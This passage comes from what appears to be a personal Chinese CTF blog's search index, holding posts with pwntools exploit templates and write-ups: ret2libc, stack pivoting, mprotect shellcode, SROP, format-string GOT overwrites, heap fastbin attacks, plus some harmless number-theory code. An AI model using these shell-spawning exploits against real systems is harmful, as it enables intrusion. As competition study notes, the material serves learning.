libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)ret_addr=0x00000000004004c9payload2 = b&#x27;a&#x27; * 40 +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)p.sendlineafter(&quot;Pull up your sword and tell me u story!&quot;,payload2)p.interactive()\n\n64位writefrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&#x27;node4.buuoj.cn&#x27;,26446)elf=ELF(&quot;level3_x64&quot;)main_addr = elf.sym[&#x27;main&#x27;]write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]pop_rdi_ret=0x00000000004006b3pop_rsi_r15_ret=0x00000000004006b1payload =b&#x27;a&#x27; * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)p.sendlineafter(&quot;:&quot;,payload)write_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(write_addr))libc = ELF(&quot;libc-2.23.so&quot;)libc_base = write_addr - libc.sym[&#x27;write&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)ret_addr=0x00000000004004c9payload2 =b&#x27;a&#x27; * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)p.sendlineafter(&quot;:&quot;,payload2)p.interactive()\n\nlibc不匹配别害怕，这样搞from pwn import *from LibcSearcher import *p = remote(&quot;123.60.135.228&quot;,2082)#p= process(&#x27;./sleep&#x27;)context.log_level=&quot;debug&quot;elf=ELF(&quot;sleep&quot;)main_addr = 0x0000000004006BDputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]gets_plt = 0x000000000400550pop_rdi_ret=0x0000000000400783payload =b&#x27;a&#x27; * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main_addr)#attach(p)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload)#p.interactive()puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = 0x0000000000601040ret_addr = 0x0000000000400501#attach(p)payload2 = b&#x27;a&#x27; * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(0x000000000601040)+p64(gets_plt)+p64(ret_addr)+p64(main_addr)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload2)sleep(2)p.sendline(b&#x27;/bin/sh\\0&#x27;)payload2 = b&#x27;a&#x27; * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload2)p.interactive()\n\n栈迁移from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)p=remote(&#x27;123.60.135.228&#x27;,2095)sys_addr=0X08048420leave_ret=0x080484d8#p=process(&quot;./pwn3&quot;)payload=b&#x27;a&#x27;*40#attach(p)p.sendafter(&quot;Please input your name:&quot;,payload)ebp= u32(p.recvuntil(&quot;\\xff&quot;)[-4:])-16print(hex(ebp))payload2=b&#x27;aaaa&#x27;+p32(sys_addr)+4*b&#x27;a&#x27;+p32(ebp-24)+b&#x27;/bin/sh&#x27;+b&#x27;\\0&#x27;+16*b&#x27;a&#x27;+p32(ebp-40)+p32(leave_ret)#                4            8     12             16           23   24       40            44#        40     36            32    28             24          17    16        0#attach(p)p.sendafter(&quot;Would you like tell me some message:&quot;,payload2)p.interactive()\n\n利用mprotectfrom pwn import *  q = remote(&#x27;node3.buuoj.cn&#x27;,29645)  \\#q = process(&#x27;./get_started_3dsctf_2016&#x27;)  context.log_level = &#x27;debug&#x27;  mprotect = 0x0806EC80  buf = 0x80ea000  pop_3_ret = 0x0804f460  read_addr = 0x0806E140  payload = &#x27;a&#x27;*56  payload += p32(mprotect)  payload += p32(pop_3_ret)  payload += p32(buf)  payload += p32(0x1000)  payload += p32(0x7)  payload += p32(read_addr)  payload += p32(buf)  payload += p32(0)  payload += p32(buf)  payload += p32(0x100)  q.sendline(payload)  sleep(0.1)  shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)  q.sendline(shellcode)  sleep(0.1)  q.interactive()    \n\nIOFILE# coding=utf-8from pwn import *from LibcSearcher import *  from ctypes import *# context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;p = remote(&#x27;10.52.13.156&#x27;, 53493)# p = process(&#x27;./feedback&#x27;)p.sendlineafter(&quot;Which list do you want to write?&quot;,b&quot;-8&quot;)payload = p64(0xFBAD1800) + p64(0)*3 + b&#x27;\\x00&#x27;p.sendlineafter(&quot;.\\n&quot;,payload)p.recvuntil(b&#x27;\\x00&#x27;*8)libc_base = u64(p.recv(8)) - 0x1ec980success(hex(libc_base))flag = libc_base + 0x1f1700p.sendlineafter(&quot;?&quot;,b&quot;-11&quot;)p.sendlineafter(&quot;.&quot;,b&#x27;\\x68&#x27;)p.sendlineafter(&quot;?&quot;,b&quot;-11&quot;)p.sendlineafter(&quot;.&quot;,p64(flag))p.interactive()\n\nsropfrom pwn import *context.arch=&#x27;amd64&#x27;context.log_level=&#x27;debug&#x27;power_rop1=0x0000000000400806power_rop2=0x00000000004007F0buf_inp=0x0000000000601039pop_rbp=0x0000000000400628bss_addr=0x0000000000601050def getpower(avg1,avg2,avg3,got):    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8    return payload# p=process(&#x27;./pwn&#x27;)p=process(&#x27;../出题/pwn3/pwn&#x27;)# p=remote(&#x27;162.14.104.152&#x27;,&#x27;10017&#x27;)# p=remote(&#x27;nepctf.1cepeak.cn&#x27;,&#x27;31507&#x27;)elf=ELF(&#x27;pwn&#x27;)libc=ELF(&#x27;./libc-2.27.so&#x27;)syscall_got=elf.got[&#x27;syscall&#x27;]seccomp_init_got=elf.symbols[&#x27;seccomp_init&#x27;]# pause()# gdb.attach(p,&#x27;b *0x000000000040078D&#x27;)# pause()payload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;*(0x30//8)+p64(0x4007b0)payload+=getpower(0,0,buf_inp,syscall_got)# payload+=getpower(buf_inp,0,0,syscall_got)payload+=getpower(1,1,syscall_got,syscall_got)payload+=p64(pop_rbp)+p64(buf_inp+8)# payload+=getpower(0,0,buf_inp+0x10,syscall_got)# payload+=getpower(1,syscall_got,0x20,syscall_got)# payload+=p64(elf.symbols[&#x27;__libc_start_main&#x27;])payload+=p64(0x000000000040076D)# payload+=getpower(buf_inp,0,2,syscall_got)# payload+=getpower(3,buf_inp+0x6,0x30,syscall_got)# payload+=getpower(1,buf_inp+0x6,0x30,syscall_got)p.sendlineafter(b&#x27;!!!\\n&#x27;,payload)# p.sendlineafter(b&#x27;NepCTF2023!\\n&#x27;,payload)pause()p.sendline(b&#x27;flag\\x00\\x00\\x00\\x00&#x27;+p64(0x601000))# pause()# payload=b&#x27;a&#x27;*0x30+p64(0x4007b0)# payload+=getpower(1,1,syscall_got,syscall_got)# payload+=p64(0x000000000040076D)# p.sendlineafter(b&#x27;NepCTF2023!\\n&#x27;,payload)# pause()# # p.sendline(b&#x27;&#x27;)# 控制rax为1# # # 接收libcrecvaddr=p.recvuntil(b&#x27;\\x7f&#x27;)sysaddr=u64(recvaddr[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(sysaddr))libcbase=sysaddr-libc.symbols[&#x27;syscall&#x27;]print(&#x27;libcbase&#x27;,hex(libcbase))pop_rax=libcbase+0x000000000001b500open_addr=libcbase+libc.symbols[&#x27;open&#x27;]read_addr=libcbase+libc.symbols[&#x27;read&#x27;]write_addr=libcbase+libc.symbols[&#x27;write&#x27;]pop_rdi=0x0000000000400813pop_rdx_rsi=libcbase+0x0000000000130539pop_rsp=libcbase+0x000000000000396cpop_rcx=libcbase+0x00000000000e433epayload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;*(0x30//8)+p64(0x4007b0)payload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)# payload+=getpower(buf_inp,0,0,syscall_got)payload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])payload+=p64(pop_rax)+p64(0)payload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])payload+=p64(pop_rax)+p64(1)payload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])# payload+=payload+=p64(0x000000000040076D)print(&#x27;len&#x27;,len(payload))# p.sendlineafter(b&#x27;NepCTF2023!\\n&#x27;,payload)p.sendlineafter(b&#x27;!!!\\n&#x27;,payload)# # pop_rax=libcbase+0x000000000001b500# # payload2=p.interactive()\n","categories":["笔记","模板"],"tags":["模板"]},{"title":"信安数学自编代码","url":"/2023/09/21/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E8%87%AA%E7%BC%96%E4%BB%A3%E7%A0%81/","content":"测试求10的8次方内素数能力枚举法\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;math.h&gt;int main()//求个10^8内素数玩玩&#123;    for(int i=2;i&lt;pow(10,8);i++)    &#123;        int flag=0;        for(int j=2;j&lt;=pow(i,0.5);j++)        &#123;            if(i%j==0)            &#123;                flag=1;                break;            &#125;        &#125;        if(flag==1)continue;        //printf(&quot;%d\\n&quot;,i);    &#125;    printf(&quot;finish&quot;);&#125;\n\n筛法#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;math.h&gt;#include&lt;malloc.h&gt;typedef struct link&#123;    int num;    struct link *next;&#125; link;void Initlink(link * first)&#123;    first-&gt;num=666;    first-&gt;next=malloc(sizeof(link));    link * t=first-&gt;next;    t-&gt;num=2;    t-&gt;next=malloc(sizeof(link));    t=t-&gt;next;    t-&gt;num=3;    t-&gt;next=malloc(sizeof(link));    t=t-&gt;next;    t-&gt;num=5;    t-&gt;next=malloc(sizeof(link));    t=t-&gt;next;    t-&gt;num=7;    t-&gt;next=malloc(sizeof(link));    t=t-&gt;next;    t-&gt;next=NULL;&#125;void print_all(link * head)&#123;    head=head-&gt;next;    while(head-&gt;next)    &#123;        printf(&quot;%d\\n&quot;,head-&gt;num);        head=head-&gt;next;    &#125;&#125;int main()//求个10^8内素数玩玩&#123;    link * head=malloc(sizeof(link));    Initlink(head);    int linknum=4;    int min=10;    for(int i=1; i&lt;4; i++)    &#123;        //printf(&quot;%d\\n&quot;,panju);        link * t;        for(int j=min; j&lt;min*min; j++)        &#123;            t=head;            int flag=0;            t=t-&gt;next;            for(int h=0;t-&gt;num&lt;=sqrt(j)+1;h++)            &#123;                if(j%t-&gt;num==0)                &#123;                    flag++;                    break;                &#125;                t=t-&gt;next;            &#125;            if(flag==0)            &#123;                while(t-&gt;next)                &#123;                    t=t-&gt;next;                &#125;                t-&gt;next=malloc(sizeof(link));                t-&gt;num=j;                t=t-&gt;next;                t-&gt;next=NULL;                linknum++;            &#125;            if(j==100000)printf(&quot;%d&quot;,linknum);        &#125;        min=min*min;    &#125;    //print_all(head);    printf(&quot;%d&quot;,linknum);    //printf(&quot;finish&quot;);&#125;\n\n计算余数（python）\nchoice=input(&#x27;input choice\\n&#x27;)if choice==&#x27;1&#x27;:    a = input(&#x27;input a\\n&#x27;)    ea = eval(a)    print(ea)    b = input(&#x27;input b\\n&#x27;)    eb = eval(b)    print(eb)    output = &quot;a chu b=&quot; + str(ea // eb) + &#x27;...&#x27; + str(ea % eb)    print(output)    input(&#x27;hahaha&#x27;)else:    a1 = int(input(&#x27;input a1\\n&#x27;))    a2 = int(input(&#x27;input a2\\n&#x27;))    a = pow(a1,a2)    print(a)    b1 = int(input(&#x27;input b1\\n&#x27;))    b2 = int(input(&#x27;input b2\\n&#x27;))    b = b1 * b2    print(b)    output = &quot;a chu b=&quot; + str(a // b) + &#x27;...&#x27; + str(a % b)    print(output)    input(&#x27;hahaha&#x27;)\n\n","categories":["笔记"]},{"title":"分组对抗-1-OK-WP","url":"/2023/08/24/%E5%88%86%E7%BB%84%E5%AF%B9%E6%8A%97-1-OK-WP/","content":"super——idol\nhttps://blog.csdn.net/m0_73644864/article/details/128985892\ncsdn大法，秒了\n尊嘟假嘟我觉得这更像一段逆向，他甚至抹了符号表，我哭死\nfrom pwn import *context.log_level=&quot;debug&quot;p=remote(&quot;ctf.v50to.cc&quot;,10281)#p=process(&quot;./pwn&quot;)p.sendline(&quot;O.O&quot;)sleep(1)p.sendline(&quot;O.O&quot;)pop_rdi_ret=0x0000000000401bb3payload=b&#x27;O.o&#x27;+b&#x27;\\0&#x27;+b&#x27;a&#x27;*0x74+p64(pop_rdi_ret)+p64(0)+p64(0x0000000004015FE)p.sendlineafter(&quot;o.oo.oo.oo.o o.oO.O O.Oo.oO.Oo.o O.Oo.oO.O o.o o.oO.Oo.o? (O.O/o.o)&quot;,payload)p.interactive()\n\n尊嘟\npwn2一道简单的fmt，改putchar_got到后门\nfrom pwn import *context.log_level=&quot;debug&quot;context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)#p = process(&quot;./2048&quot;)p=remote(&quot;ctf.v50to.cc&quot;,10259)elf = ELF(&quot;./2048&quot;)putchar_got = elf.got[&#x27;putchar&#x27;]print(putchar_got)sys_plt = 0x000000000401DB6offset = 6payload = fmtstr_payload(offset, &#123;putchar_got: sys_plt&#125;)p.sendlineafter(&quot;start: &quot;, payload)sleep(1)p.interactive()\n\n点我下载\npwn4一个简单的shellcode绕过，限制是可见字符，搜索各种指令的机器码，push为可见范围内，再加一个00绕过后续检查，再用一个pop消除push的影响，下面粘贴通用的shellcode\nfrom pwn import *context.log_level=&quot;debug&quot;context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)#p = process(&quot;./runner&quot;)p=remote(&quot;ctf.v50to.cc&quot;,10265)shellcode = asm(&#x27;&#x27;&#x27;        /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        /* push b&#x27;/bin///sh\\x00&#x27; */        push 0x00        pop rsi        push 0x68        mov rax, 0x732f2f2f6e69622f        push rax        mov rdi, rsp        /* push argument array [&#x27;sh\\x00&#x27;] */        /* push b&#x27;sh\\x00&#x27; */        push 0x1010101 ^ 0x6873        xor dword ptr [rsp], 0x1010101        xor esi, esi /* 0 */        push rsi /* null terminate */        push 8        pop rsi        add rsi, rsp        push rsi /* &#x27;sh\\x00&#x27; */        mov rsi, rsp        xor edx, edx /* 0 */        /* call execve() */        push 59 /* 0x3b */        pop rax        syscall    &#x27;&#x27;&#x27;)p.sendlineafter(&quot;shell&quot;,shellcode)p.interactive()\n\n点我下载\nabcgame前面的剪刀石头布无所谓，三分之一的概率，不需要写脚本爆破，后面是一个泄露canary和rbp，NX没关，直接在栈里面写shellcode，再用rbp计算得shellcode起始位置，把puts的got改过去，后续运行到puts时就会getshell\nfrom pwn import *context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)elf = ELF(&quot;abcgame&quot;)main_addr = elf.sym[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]#p = process(&quot;./abcgame&quot;)p = remote(&quot;ctf.v50to.cc&quot;, 10372)# p=process(&quot;./fmt&quot;)name = b&#x27;a&#x27;* (0x30-8)+b&#x27;^&#x27;p.sendafter(&quot;name?&quot;, name)p.recvuntil(&quot;^&quot;)canary_and_rbp_old=p.recvuntil(&quot;,&quot;)canary=u64(p8(0)+canary_and_rbp_old[:-7])rbp_old=u64(canary_and_rbp_old[7:-1]+p16(0))print(hex(canary))print(hex(rbp_old))gift=b&#x27;a&#x27;* (0x30-8)+b&#x27;\\0&#x27;p.sendafter(&quot;gift&quot;, gift)p.sendafter(&quot;choice?\\n&quot;, b&#x27;a&#x27;)fmt=fmtstr_payload(6, &#123;puts_got : rbp_old-0x70+51&#125;)shellcode=asm(shellcraft.sh())padding=(0x70-8)shell = shellcode.ljust(padding,b&#x27;\\x90&#x27;)payload=shell+p64(canary)+p64(rbp_old+1000)+p64(rbp_old-0x70)sleep(0.5)p.sendafter(&quot;Which flag do you want?&quot;,payload)p.interactive()\n\n点我下载\nbabyrecc的pwn实在做不了了，去看了个re，区段名被修改了的upx，查到修改以后的区段名，replace回upx，直接upx -d，得到源exe文件\n在里面找到了一个加密函数，以及flag加密后的结果，\nchar str[30]=   &#123;       0xA,0x6, 0x6E, 0x2E, 0xBE, 0x41, 0x79, 0x6E, 0x94, 0x2C, 0x7E, 0x43, 0xC1, 0x39, 0xA4, 0x5A, 0x52,       0x17, 0x78, 0x6E, 0x94, 0x1D, 0x6C, 0x2B, 0x88, 0x1D, 0x9D, 0x42, 0x7d   &#125;;   int v6=114514;for ( j = 0; ; ++j ) &#123;   v3 = j;   if ( v3 &gt;= strlen(Str) )     break;   Str[j] = (Str[j] ^ Str[j + 1]) + v6 * (j % 2); &#125;\n\n我直接一个逆向c代码\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;string.h&gt;int main()&#123;    char miwen[30]=    &#123;        0xA,0x6, 0x6E, 0x2E, 0xBE, 0x41, 0x79, 0x6E, 0x94, 0x2C, 0x7E, 0x43, 0xC1, 0x39, 0xA4, 0x5A, 0x52,        0x17, 0x78, 0x6E, 0x94, 0x1D, 0x6C, 0x2B, 0x88, 0x1D, 0x9D, 0x42, 0x7d    &#125;;    int v6=114514;    for( int i=27;i&gt;=0;i--)    &#123;        miwen[i]-=v6 *((i+1) % 2);        miwen[i]=miwen[i]^miwen[i+1];    &#125;    for(int i=0; i&lt;29; i++)    &#123;        printf(&quot;%c&quot;,miwen[i]);    &#125;&#125;\n\n最后没完全解密，不过只缺了开头三个字母，按照惯例是fla（g），懒得改了\n賏g{U9x_1s_s0_f4nny_1snt_it?}\n点我下载\n","categories":["参赛WP"],"tags":["WP","分组对抗"]},{"title":"pwn从头开始的复习（rop高级篇）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E9%AB%98%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"除了之前的一般的rop，还有一些高级的运用，srop和frop\nsrop还没完全学成，在我的导航里面有参考资料\nfrom pwn import *context.arch=&#x27;amd64&#x27;context.log_level=&#x27;debug&#x27;power_rop1=0x0000000000400806power_rop2=0x00000000004007F0buf_inp=0x0000000000601039pop_rbp=0x0000000000400628bss_addr=0x0000000000601050def getpower(avg1,avg2,avg3,got):    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8    return payloadp=process(&#x27;./pwn&#x27;)#p=remote(&quot;ctf.v50to.cc&quot;,10402)elf=ELF(&#x27;pwn&#x27;)libc=ELF(&#x27;./libc-2.27.so&#x27;)syscall_got=elf.got[&#x27;syscall&#x27;]seccomp_init_got=elf.symbols[&#x27;seccomp_init&#x27;]payload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;*(0x30//8)+p64(0x4007b0)payload+=getpower(0,0,buf_inp,syscall_got)payload+=getpower(1,1,syscall_got,syscall_got)payload+=p64(pop_rbp)+p64(buf_inp+8)payload+=p64(0x000000000040076D)p.sendlineafter(b&#x27;!!!\\n&#x27;,payload)# p.sendlineafter(b&#x27;NepCTF2023!\\n&#x27;,payload)p.sendline(b&#x27;flag\\x00\\x00\\x00\\x00&#x27;+p64(0x601000))# pause()recvaddr=p.recvuntil(b&#x27;\\x7f&#x27;)sysaddr=u64(recvaddr[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(sysaddr))libcbase=sysaddr-libc.symbols[&#x27;syscall&#x27;]print(&#x27;libcbase&#x27;,hex(libcbase))pop_rax=libcbase+0x000000000001b500open_addr=libcbase+libc.symbols[&#x27;open&#x27;]read_addr=libcbase+libc.symbols[&#x27;read&#x27;]write_addr=libcbase+libc.symbols[&#x27;write&#x27;]pop_rdi=0x0000000000400813pop_rdx_rsi=libcbase+0x0000000000130539pop_rsp=libcbase+0x000000000000396cpop_rcx=libcbase+0x00000000000e433epayload=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;*(0x30//8)+p64(0x4007b0)payload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)# payload+=getpower(buf_inp,0,0,syscall_got)payload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])payload+=p64(pop_rax)+p64(0)payload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])payload+=p64(pop_rax)+p64(1)payload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])# payload+=payload+=p64(0x000000000040076D)print(&#x27;len&#x27;,len(payload))# p.sendlineafter(b&#x27;NepCTF2023!\\n&#x27;,payload)p.sendlineafter(b&#x27;!!!\\n&#x27;,payload)# # pop_rax=libcbase+0x000000000001b500# # payload2=p.interactive()\n\nfrop就是iofile，在我的导航里面有\n","categories":["复习"],"tags":["复习","rop"]},{"title":"初探爆破","url":"/2023/08/05/%E5%88%9D%E6%8E%A2%E7%88%86%E7%A0%B4/","content":"初探爆破可见字符三位可见字符大概需要半分钟，每多一位时间翻80倍左右，而在服务器条件下每次交互会有大概0.1s延迟，使可见爆破的极限基本锁定在三位\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;    char password[100] = &quot;3h9&quot;;    char input[100] = &quot;&quot;;    while (1)    &#123;        puts(&quot;input:&quot;);        scanf(&quot;%s&quot;, input);        if (!strcmp(password, input))            puts(&quot;flag is flag&#123;heshi_tested_baopo&#125;&quot;);        else            puts(&quot;wrong&quot;);    &#125;&#125;\n\n\n\nfrom pwn import *p = process(&quot;./baopo&quot;)for i in range(43,125):    for j in range(43, 125):        for k in range(43, 125):                    p.sendlineafter(&quot;:&quot;,p8(i)+p8(j)+p8(k) )                    p.recvline()                    rcv = p.recvline()                    if b&#x27;flag&#x27; in rcv:                        print(rcv)                        print(p8(i)+p8(j)+p8(k))                        breakp.interactive()print(&quot;end&quot;)\n\n\n\n爆破数字六位密码的爆破基本上可以在几分钟内完成，在服务器条件可能需要延长到半小时内。\nfrom pwn import *#context.log_level=&quot;debug&quot;p = process(&quot;./baopo&quot;)for i in range(1000000):                    p.sendlineafter(&quot;:&quot;,str(i) )                    p.recvline()                    rcv = p.recvline()                    if b&#x27;flag&#x27; in rcv:                        print(rcv)                        print(i)                        breakp.interactive()print(&quot;end&quot;)\n\n\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;    char password[100] = &quot;839325&quot;;    char input[100] = &quot;&quot;;    while (1)    &#123;        puts(&quot;input:&quot;);        scanf(&quot;%s&quot;, input);        if (!strcmp(password, input))            puts(&quot;flag is flag&#123;heshi_tested_baopo&#125;&quot;);        else            puts(&quot;wrong&quot;);    &#125;&#125;\n\n","categories":["笔记"],"tags":["探索"]},{"title":"堆学习（经典题）","url":"/2023/11/14/%E5%A0%86%E5%AD%A6%E4%B9%A0%EF%BC%88%E7%BB%8F%E5%85%B8%E9%A2%98%EF%BC%89/","content":"off_by_onefrom pwn import *from LibcSearcher import *context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;def add(size,contet):    p.sendafter(&quot;Your choice :&quot;,b&#x27;1&#x27;)    p.sendafter(&quot;Size of Heap :&quot;,str(size))    p.sendafter(&quot;Content of heap:&quot;,contet)def edit(index,contet):    p.sendafter(&quot;Your choice :&quot;,b&#x27;2&#x27;)    p.sendafter(&quot;Index :&quot;,str(index))    p.sendafter(&quot;Content of heap :&quot;,contet)def show(index):    p.sendafter(&quot;Your choice :&quot;,b&#x27;3&#x27;)    p.sendafter(&quot;Index :&quot;, str(index))def dele(index):    p.sendafter(&quot;Your choice :&quot;,b&#x27;4&#x27;)    p.sendlineafter(&quot;Index :&quot;,str(index))# p= process(&quot;./heapcreator&quot;)p=remote(&quot;node4.buuoj.cn&quot;,27274)add(0x18,b&#x27;a&#x27;)add(0x10,b&#x27;b&#x27;)add(0x10,b&#x27;c&#x27;)add(0x10,b&#x27;/bin/sh&#x27;)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\x81&#x27;)dele(1)add(0x70,b&#x27;a&#x27;)edit(1,0x10*b&#x27;b&#x27;+p64(0)+p64(0x21)+p64(0x40)+p64(0x000000000602018))# attach(p)show(1)free=p.recvuntil(&quot;\\x7f&quot;)[-6:]+b&#x27;\\0&#x27;*2free = u64(free)print(hex(free))libc=LibcSearcher(&quot;free&quot;,free)system=libc.dump(&quot;system&quot;)print(libc)#attach(p)edit(1,p64(system+free-libc.dump(&quot;free&quot;)))dele(3)p.interactive()\n","categories":["笔记"],"tags":["堆","学习"]},{"title":"堆学习（初级）","url":"/2023/11/02/%E5%A0%86%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%88%9D%E7%BA%A7%EF%BC%89/","content":"堆溢出babyheap_0ctf_2017典型堆溢出，但使用了calloc（在malloc后会清空申请的空间），对泄露libc造成了一些麻烦\n解法不少，目前学了一种\n思路堆地址未知add0，1，2，3（只有3要求大一些，放到unsorted）0作用：修改1和2free1free2会放到fastbin，2-&gt;10溢出，穿过1，修改2的fd指针，改到3的身上fastibn：2-&gt;3(1丢失)add 1(申请到2)按理来说再add 2就可以申请到3，双重身份，但是3的大小不符合fast，必然申请不出来所以fill 1 （用2溢出到3，修改3的大小到0x10，满足fast）add 2(申请到了3)add 4(0x80，防止合并到top)fill 1 （再改回去，保证等等放到unsorted）free 3 （放到第一个unsorted，fd和bd都会变成libc_areas+xx）dump 2 查看3里面的fd泄露libc完成，后面的就是常规堆溢出\n\nexpfrom pwn import *context.log_level = &quot;debug&quot;context.arch=&quot;amd64&quot;one=[0x45216,0x4526a]def add(size):    p.sendlineafter(&quot;Command:&quot;,&quot;1&quot;)    p.sendlineafter(&quot;Size:&quot;,str(size))def fill(index,context):    p.sendlineafter(&quot;Command:&quot;,&quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;,str(index))    p.sendlineafter(&quot;Size:&quot;, str(len(context)))    p.sendlineafter(&quot;Content:&quot;, context)def free(index):    p.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))def dump(index):    p.sendlineafter(&quot;Command:&quot;,&quot;4&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))def pwn(i):    try:        add(0x10)  # 0        add(0x10)  # 1        add(0x10)  # 2        add(0x80)  # 3        free(1)  # 释放1        free(2)  # 释放2        fill(0, b&quot;a&quot; * 0x10 + p64(0) + p64(0x21) + b&quot;a&quot; * 0x10 + p64(0) + p64(0x21) + p8(0x60))  # 使2指向3        add(0x10)  # 申请回来2编号为1        fill(1, b&quot;a&quot; * 0x10 + p64(0) + p64(0x21))        add(0x10)  # 申请到3编号为2        add(0x80)  # 防止合并，编号为5        fill(1, b&quot;a&quot; * 0x10 + p64(0) + p64(0x91))        free(3)  # 把3放到uns        # attach(p)        dump(2)  # dump(2)#查看3中的libc        libc = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&quot;\\0&quot; * 2)        malloc_hook = libc - 0x68        libc_base = libc + 0x7f7a5ee00000 - 0x7f7a5f1c4b78        one_gadget=one[1]+libc_base        print(hex(libc))        success(hex(malloc_hook))        add(0x80)  # 取出3，放到3，把exp两部分分开        add(0x60)  # 6        add(0x60)  # 7        add(0x60)  # 8,防合并        free(7)        fill(6, b&quot;a&quot; * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 0x10 - i))        add(0x60)  # 7        add(0x60)  # 8,mallochook        fill(8, b&quot;aaa&quot;+p64(one_gadget))        add(0x10)        p.interactive()    except:        passp = remote(&quot;node4.buuoj.cn&quot;,27576)pwn(3)\n\n第二天看其他人的wp，发现不需要另起炉灶，下面是简易的exp\nexp2from pwn import *context.log_level = &quot;debug&quot;context.arch=&quot;amd64&quot;one=[0x45216,0x4526a]def add(size):    p.sendlineafter(&quot;Command:&quot;,&quot;1&quot;)    p.sendlineafter(&quot;Size:&quot;,str(size))def fill(index,context):    p.sendlineafter(&quot;Command:&quot;,&quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;,str(index))    p.sendlineafter(&quot;Size:&quot;, str(len(context)))    p.sendlineafter(&quot;Content:&quot;, context)def free(index):    p.sendlineafter(&quot;Command:&quot;,&quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))def dump(index):    p.sendlineafter(&quot;Command:&quot;,&quot;4&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))p = 